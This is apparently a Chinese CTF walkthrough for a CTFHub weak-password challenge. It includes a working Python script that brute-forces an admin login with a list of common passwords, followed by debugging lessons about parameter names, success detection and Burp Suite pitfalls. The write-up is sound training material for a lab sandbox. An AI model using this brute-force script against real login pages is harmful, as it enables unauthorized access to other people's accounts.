## 解题思路
 
题目提示为“弱口令”，说明后台登录页面没有验证码和登录次数限制，可以通过自动化脚本加载常见字典进行暴力破解。本次解题全程使用 Python，核心在于抓包确认参数名，并寻找合适的登录成功判断条件。

## 解题步骤
 
# 抓包与参数分析
 
打开题目环境，按 F12 打开开发者工具，切换到 网络 (Network) 面板。
输入测试账号密码点击登录，抓取 POST 请求，查看请求载荷（Payload）：
name=admin&password=123456&referer=
# 编写 Python 爆破脚本
 
利用 Python 的 requests 库发送 POST 请求。因为 Python 会自动计算请求头的 Content-Length，避免了手动使用 Burp Suite 时容易出现长度不匹配导致 400 状态码的问题。
 
编写并运行以下脚本：
import requests

url = "http://challenge-72751253c0f3b6b3.sandbox.ctfhub.com:10800/"

pwd_list = [
    "admin",
    "admin123",
    "123456",
    "123123",
    "111111",
    "000000",
    "12345678",
    "123456789",
    "666666",
    "888888",
    "root",
    "root123",
    "ctfhub",
    "ctfhub123",
    "password",
    "pass123",
    "123qwe",
    "qwe123",
    "qwert123",
    "123321"
]

for pwd in pwd_list:
    data = {
        "name":"admin",
        "password":pwd
    }
    res = requests.post(url, data=data)
    if "user or password is wrong" not in res.text:
        print(f"✅成功！用户名:admin 密码:{pwd}")
        print(res.text)
        exit()
    else:
        print(f"❌密码 {pwd} 错误")

print("❌当前字典全部跑完，未找到密码")
# 运行脚本获取 Flag
 
运行脚本，当发现某一组账号密码返回的页面中没有报错信息（即没有 "wrong" 或 "错误"）时，脚本会输出正确的账号密码。拿到密码后，回到浏览器登录，成功获取 Flag。

## 踩坑总结与复盘
 
坑 1：字段名猜测错误导致全盘皆输
• 错误现象：Python 脚本一直提示密码错误。
• 原因：自己想当然地认为登录框的用户名参数叫 username。
• 教训：永远不要凭空捏造参数名。写代码前必须打开 F12 或使用 Burp Suite 抓包，看清 Payload。这道题服务器只认 name。 
坑 2：成功判断条件太宽泛，导致“假阳性”
• 错误现象：脚本提示“成功”，但浏览器却无法登录。
• 原因：最初的判断逻辑写的是 if "后台" in res.text，而登录页面的 <title> 里本身就包含“后台”二字，导致所有密码都被误判为成功。
• 教训：寻找失败时独有的特征。比如错误时包含 wrong，那么成功条件就是 if "wrong" not in res.text。更稳妥的做法是比较响应长度（len(res.text)）的差异。 
坑 3：Burp Suite 的 Content-Length 陷阱
• 错误现象：Burp 爆破时全部返回 400 状态码，或者全部变成 200 但响应内容不真实。
• 原因：Burp 社区版有时不会自动更新请求头里的 Content-Length。当替换的密码长度与原始密码不一致时，服务器因长度校验失败而拒绝请求（400），或直接返回空白页（200）。
• 教训：新手初期推荐先使用 Python 的 requests 库。Python 会自动帮我们计算正确的 Content-Length，完全规避了这个底层细节的坑。 
坑 4：CTF 沙箱环境漂移
• 错误现象：之前的脚本突然全部失效。
• 原因：页面刷新或重开后，CTFHub 分配了新的沙箱地址（URL 前缀变了），旧 URL 已失效。
• 教训：每次重新打开题目页面，第一件事就是检查浏览器地址栏，将最新的 URL 同步到 Python 代码中。
